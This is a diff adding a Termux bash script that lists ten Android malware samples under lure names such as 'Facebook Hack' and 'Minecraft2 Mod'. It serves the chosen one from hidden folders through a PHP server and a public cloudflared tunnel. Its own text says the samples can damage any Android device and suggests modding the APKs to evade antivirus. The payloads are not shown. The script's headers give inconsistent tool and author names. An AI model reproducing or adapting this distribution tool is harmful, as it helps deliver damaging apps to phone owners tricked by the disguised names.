@@ -1,0 +1,137 @@
+#!/data/data/com.termux/files/usr/bin/bash
+# Tool name : AndroVirus
+# Author    : Bishal Singh [Alienkrishn]
+# Copyright : ©Alienkrishn
+# Licence   : MIT
+
+clear
+echo $'\33[35;1m'""
+figlet -f smblock "              XdroidVirus"
+echo ""
+echo $'\e[36;1m'"                   by Mr.X"$'\e[31;1m'" ["$'\e[37;1m'"Binc Team"$'\e[31;1m'"]"
+echo
+echo -e "\e[0;1m-----------------------------------------------------------\e[0m  
+
+\e[4mDon't install any virus from this script in your device\e[0m
+\e[4mI won't be responsible for any damage\e[0m 
+\e[4mcaused by this script....\e[0m
+
+[1] \e[31;1mVirus for Android\e[0m
+[2] \e[31;1mAbout This Script\e[0m
+[3] \e[31;1mAbout Devloper and more Tools\e[0m
+[0] \e[31;1mExit\e[0m
+"
+read -p "Enter your choice > " av
+
+avirus() {
+    echo -e "
+ [01] Agent
+ [02] AndroidFramework
+ [03] ArtStation
+ [04] BadNews
+ [05] BrainTest
+ [06] Facebook Hack
+ [07] IWinOnline
+ [08] Minecraft2 Mod
+ [09] MusicPlayer
+ [10] Settings
+ [00] Exit
+
+ "
+}
+lund(){
+    read -p "Virus for Android > " vr
+}
+about(){
+    echo "
+Tool name : XdroidVirus 
+version   : 1.0
+Devloper  : Mr.X
+Language  : BASH
+
+This script has collection of 10 viruses 
+which can damage any android device 
+some of them can be detect by antivirus
+use your apk modding knowladge to prevemt it
+this script uses php to host html template on localhost
+and for port forwording it uses cloudflared keep your
+hotspot on for using this tool some device dosn't require
+hostspot...
+    "
+}
+wserver(){
+    echo -e "\a\n\e[32;1mIf links are not shown turn hotspot on...\n"
+    sleep 2
+    printf "Starting php server...\r"
+    php -S localhost:8080 -t $web > /dev/null 2>&1 &
+    sleep 3
+    printf "Starting cloudflared...\r"
+    cloudflared --url localhost:8080 --logfile .cflog > /dev/null 2>&1 &
+    sleep 5
+    link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cflog")
+    echo -e "\e[31;1myour link are given bellow \e[34;1m\n" 
+    echo Cloudflared : $link
+    echo -e "\nLocalHost   : http://localhost:8080"
+    echo -e "\a\n\n\e[0mPress enter to exit"
+    read -e
+    killall -9 cloudflared > /dev/null 2>&1 &
+    killall -9 php > /dev/null 2>&1 &
+    rm .cflog > /dev/null 2>&1 &
+}
+if [ $av = 1 ] ;then
+    avirus
+    lund
+    if [[ $vr = 1 || $vr = 01 ]] ; then
+        web="$HOME/.fxv/v1"
+        wserver
+    elif [[ $vr = 2 || $vr = 02 ]] ; then
+        web="$HOME/.fxv/v2"
+        wserver
+    elif [[ $vr = 3 || $vr = 03 ]] ; then
+        web="$HOME/.fxv/v3"
+        wserver
+    elif [[ $vr = 4 || $vr = 04 ]] ; then
+        web="$HOME/.fxv/v4"
+        wserver
+    elif [[ $vr = 5 || $vr = 05 ]] ; then
+        web="$HOME/.fxv/v5"
+        wserver
+    elif [[ $vr = 6 || $vr = 06 ]] ; then
+        web="$HOME/.fxv/v6"
+        wserver
+    elif [[ $vr = 7 || $vr = 07 ]] ; then
+        web="$HOME/.fxv/v7"
+        wserver
+    elif [[ $vr = 8 || $vr = 08 ]] ; then
+        web="$HOME/.fxv/v8"
+        wserver
+    elif [[ $vr = 9 || $vr = 09 ]] ; then
+        web="$HOME/.fxv/v9"
+        wserver
+    elif [ $vr = 10 ] ; then
+        web="$HOME/.fxv/v0"
+        wserver
+    elif [[ $vr = 0 || $vr = 00 ]] ; then
+        echo "Thanks for using this script"
+        sleep 3
+        exit
+    else
+        echo Mr.X here!
+        sleep 3 ; exit
+    fi
+
+elif [ $av = 2 ] ; then
+about
+elif [ $av = 3 ] ; then
+    xdg-open "https://github.com/Whomrx666"
+elif [ $av = 0 ] ; then
+    echo Thanks for using this script exiting...
+    sleep 3
+    exit
+else
+    echo Mr.X here!
+    sleep 2
+    av
+fi
+
+ 
